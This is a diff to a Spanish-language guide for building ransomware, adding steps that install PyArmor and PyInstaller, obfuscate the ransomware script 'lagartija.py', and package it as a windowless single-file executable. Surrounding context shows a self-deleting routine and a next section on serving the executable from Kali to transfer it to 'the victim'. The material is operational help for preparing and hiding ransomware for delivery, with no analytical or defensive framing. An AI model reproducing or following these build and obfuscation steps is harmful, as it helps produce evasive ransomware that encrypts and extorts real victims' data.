@@ -601,6 +601,38 @@ Prepara tu entorno Python para compilar el ransomware:
         print("Proceso finalizado. Avengers unidos... 👋\n")
         self_delete_executable()
     ---
+    
+6.  **Instala las librerías necesarias:**
+    ```bash
+    pip install cryptography pyarmor pyinstaller
+    ```
+7.  **Ofusca el script `lagartija.py`:**
+    ```bash
+    pyarmor gen --output pyarmor_output lagartija.py
+    ```
+8.  **Obtén la ruta de la librería `cryptography` en el entorno virtual:**
+    Este comando te dará la ruta exacta de la librería `cryptography` dentro de tu entorno virtual de Kali. ¡Cópiala, la necesitarás para el siguiente paso!
+    ```bash
+    python -c "import cryptography; import os; print(os.path.dirname(cryptography.__file__))"
+    ```
+9.  **Comando de PyInstaller para empaquetar el ransomware:**
+    **Importante:** Reemplaza `<RUTA_CRYPTOGRAPHY_ENV>` en la última línea con la ruta que obtuviste en el paso anterior.
+    ```bash
+    pyinstaller --noconsole --onefile \
+                --distpath . \
+                --name lagarto \
+                --add-data "pyarmor_output/pyarmor_runtime_000000:." \
+                --hidden-import "cryptography.hazmat.backends.openssl" \
+                --hidden-import "cryptography.hazmat.primitives.ciphers" \
+                --hidden-import "cryptography.x509" \
+                --collect-all cryptography \
+                --collect-binaries cryptography \
+                --collect-data cryptography \
+                --paths "/usr/lib/x86_64-linux-gnu" \
+                --paths "<RUTA_CRYPTOGRAPHY_ENV>" \
+                pyarmor_output/lagartija.py
+
+
 ## 3. Pasos para Crear Servidor Web (en Kali)
 
 Para servir el ejecutable del ransomware y transferirlo fácilmente a la víctima:
